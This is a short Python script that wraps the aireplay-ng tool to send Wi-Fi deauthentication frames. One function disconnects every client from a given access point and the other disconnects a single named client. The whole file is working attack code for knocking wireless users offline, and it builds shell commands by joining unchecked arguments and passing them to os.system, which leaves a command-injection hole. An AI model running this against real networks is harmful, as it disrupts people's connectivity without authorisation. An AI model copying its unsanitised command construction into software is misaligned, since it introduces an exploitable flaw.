import os

def deauth_all(interface, access_point, number):
    # aireplay-ng -0 <number> -a <access point> <interface>
    command = 'aireplay-ng -0 ' + number + ' -a ' + access_point + ' ' + interface
    print("")
    print("Deauthenticating all clients...")
    print("")
    os.system(command)

def deauth_client(interface, access_point, client, number):
    # aireplay-ng -0 <number> -a <access point> -c <client> <interface>
    command = 'aireplay-ng -0 ' + number + ' -a ' + access_point + ' -c ' + client + ' ' + interface
    print("")
    print("Deauthenticating client "+client+"...")
    print("")
    os.system(command)